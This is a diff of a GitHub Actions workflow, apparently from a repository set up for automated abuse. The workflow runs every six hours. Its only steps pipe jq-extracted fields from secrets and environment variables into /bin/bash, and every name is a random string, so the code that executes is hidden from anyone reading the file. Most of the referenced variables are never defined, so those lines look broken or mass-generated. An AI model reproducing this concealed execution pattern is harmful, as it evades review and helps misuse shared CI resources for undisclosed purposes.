@@ -3,26 +3,23 @@ name: futuredonutt
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 5/6 * * *'
-
-jobs:  # 10239
+    - cron: '48 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: futuredonutt
         env:
-          venp514: ${{ secrets.venp514 }}
+          gqmpn30562: ${{ secrets.gqmpn30562 }}
         run: |
-          echo $venp514 | jq -r .bamnr08 | /bin/bash
-          echo $gfqfr79988 | jq -r .uxp75423 | /bin/bash
-          echo $izyql6759 | jq -r .ytab943 | /bin/bash
-          echo $kius72 | jq -r .qm357 | /bin/bash
-          echo $qka2360 | jq -r .rr2 | /bin/bash
-          echo $okwd5 | jq -r .rkvxq612 | /bin/bash
-          echo $iz7192 | jq -r .dxckv1 | /bin/bash
-          echo $dax64042 | jq -r .pspo0384 | /bin/bash
-          echo $vrx3 | jq -r .hqee38369 | /bin/bash
-          echo $sh56 | jq -r .lci10082 | /bin/bash
-          echo $ms100 | jq -r .sdgh97 | /bin/bash
+          echo $gqmpn30562 | jq -r .hxm5 | /bin/bash
+          echo $hmx65 | jq -r .jpqfz047 | /bin/bash
+          echo $laa8 | jq -r .b05051 | /bin/bash
+          echo $x999 | jq -r .n97163 | /bin/bash
+          echo $ce4951 | jq -r .bwlrw9 | /bin/bash
+          echo $qcr1987 | jq -r .slf3027 | /bin/bash
+          echo $ykdga60687 | jq -r .wp03 | /bin/bash
+          echo $plh494 | jq -r .ho01305 | /bin/bash
 
